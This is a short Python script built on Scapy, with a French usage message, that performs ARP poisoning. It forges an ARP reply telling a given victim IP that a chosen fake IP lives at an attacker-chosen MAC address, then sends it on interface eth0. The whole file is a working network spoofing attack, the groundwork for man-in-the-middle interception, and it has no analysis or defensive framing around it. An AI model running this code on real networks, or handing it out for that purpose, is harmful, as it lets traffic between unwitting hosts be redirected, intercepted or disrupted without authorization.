from scapy.all import *

def arp_poison(victimIp, fakeIp, fakeMac):
    arpPacket = ARP(
        op=2,
        pdst=victimIp,
        hwdst="ff:ff:ff:ff:ff:ff",
        psrc=fakeIp,
        hwsrc=fakeMac
    )

    send(arpPacket, iface="eth0", verbose=1)


if __name__ == "__main__":
    import sys

    if len(sys.argv) != 4:
        print("Utilisation: sudo python3 arp_poisoning.py [L'ip de la victime] [Fausse IP] [Fausse MAC]")
        sys.exit(1)

    victimIp = sys.argv[1]
    fakeIp = sys.argv[2]
    fakeMac = sys.argv[3]

    arp_poison(victimIp, fakeIp, fakeMac)
